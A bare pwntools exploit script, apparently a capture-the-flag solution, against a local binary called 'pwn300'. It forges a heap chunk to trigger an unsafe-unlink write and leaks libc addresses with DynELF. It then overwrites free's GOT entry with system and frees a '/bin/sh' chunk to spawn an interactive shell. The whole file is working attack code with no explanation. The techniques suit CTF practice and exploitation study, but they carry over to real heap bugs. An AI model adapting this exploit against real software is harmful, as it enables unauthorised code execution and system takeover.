#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#context(log_level="debug")

free_got = 0x08049d18 
chunk_addr = 0x08049D80

p = process("./pwn300")


def launch_gdb():
	context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
	gdb.attach(proc.pidof(p)[0])


def add_chunk(index):
	p.sendline('1')
	p.recvuntil('How many flowers you want :')
	p.sendline(str(index))
	


def set_chunk(index,data):
	p.sendline('3')
	p.recvuntil("Input the order's num:")
	p.sendline(str(index))
	p.recvuntil('Order content:')
	p.sendline(data)

def print_chunk(index):
	p.sendline('2')
	p.recvuntil("Input the order's num:")
	p.sendline(str(index))
	return p.recvline()
	
def delete_chunk(index):
	p.sendline('4')
	p.recvuntil("Input the order's num:")
	p.sendline(str(index))	

def leak(addr):
	data = 'a'*12 + p32(chunk_addr-12) + p32(addr)
	set_chunk(0,data) 
	data = print_chunk(1)[0:4]
	print ("leaking "+hex(addr)+" --> " + data.encode('hex'))
	return data
	



add_chunk(128)
add_chunk(128)
add_chunk(128)
add_chunk(128)
set_chunk(3,'/bin/sh')
launch_gdb()

payload = ''
payload += p32(0)+p32(0x89) + p32(chunk_addr-0xc) +p32(chunk_addr-0x8)+'a'*(0x80-4*4) + p32(0x80) +p32(0x88)


set_chunk(0,payload)	

delete_chunk(1)
pwn_elf = ELF("./pwn300")
d = DynELF(leak,elf=pwn_elf)
system_addr = d.lookup('system','libc')
print hex(system_addr)
set_chunk(0,'a'*12+p32(chunk_addr-0xc)+p32(free_got))
set_chunk(1,p32(system_addr))
delete_chunk(3)
p.interactive()







	
